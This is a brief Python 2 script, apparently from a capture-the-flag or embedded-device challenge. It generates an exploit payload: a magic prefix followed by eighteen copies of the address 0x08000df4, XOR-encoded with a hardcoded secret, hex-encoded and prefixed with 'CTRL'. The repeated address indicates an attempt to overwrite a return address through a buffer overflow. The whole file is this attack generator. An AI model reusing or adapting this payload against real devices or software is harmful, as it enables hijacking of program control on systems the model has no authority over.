import sys

secret = '93lf4s'
magic = 'c29j'

out = ""

buf = ""
# 08000df4
buf += '\xf5\x0d\x00\x08' * 18
#buf += chr(0)
for i, c in enumerate(magic + buf):
    o = (ord(c) ^ ((ord(secret[i%6]) +i)&0xFF))
    out = out + chr(o)

print 'CTRL' + out.encode('hex')

print len('CTRL' + out.encode('hex'))
